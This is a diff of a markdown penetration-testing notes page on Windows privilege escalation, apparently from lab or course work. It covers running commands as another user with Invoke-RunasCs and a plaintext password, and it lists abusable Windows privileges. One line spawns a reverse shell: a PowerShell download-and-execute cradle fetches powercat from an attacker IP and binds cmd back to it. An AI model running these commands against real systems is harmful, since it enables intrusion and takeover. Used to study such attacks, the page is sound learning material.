@@ -1,7 +1,5 @@
 # Escalating Privilege
 
-##
-
 ## Abusing Active Directory Authentication
 
 Sometimes a way of escalating privileges is by moving laterally. We can take advantage of the same techniques and tools we would use for moving laterally to escalate our privileges.
@@ -133,10 +131,6 @@ Attempting to start cmd as user "CLIENTWK220\backupadmin" ...
 PS C:\Users\steve> 
 ```
 
-
-
-
-
 ## Invoke-Runas
 
 If we've gained access to a plaintext password, but don't have a full shell, we can use the [`Invoke-Runas`](https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1) command that's part of the[ `PowerShell-Suite`](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master). Here is an updated and new version.&#x20;
@@ -148,8 +142,6 @@ PS> import-module ./Invoke-RunasCs.ps1
 PS> Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "whoami"
 ```
 
-
-
 ### Spawn reverse shell
 
 Powercat
@@ -157,3 +149,33 @@ Powercat
 ```powershell
 PS> Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "Powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.49.211/powercat.ps1');powercat -c 192.168.49.211 -p 5555 -e cmd"
 ```
+
+
+
+## Insecure Privileges
+
+The first thing to do when popping a Windows shell is to check the user privileges.
+
+```powershell
+C:\Users\svc_mssql>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                      State   
+============================= ================================ ========
+SeMachineAccountPrivilege     Add workstations to domain       Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking         Enabled 
+SeManageVolumePrivilege       Perform volume maintenance tasks Disabled
+SeIncreaseWorkingSetPrivilege Increase a process working set   Disabled
+
+```
+
+SeImpersonatePrivilege
+
+SeManageVolumePrivilege
+
+SeDebugPrivilege
+
+SeTakeOwnershipPrivilege
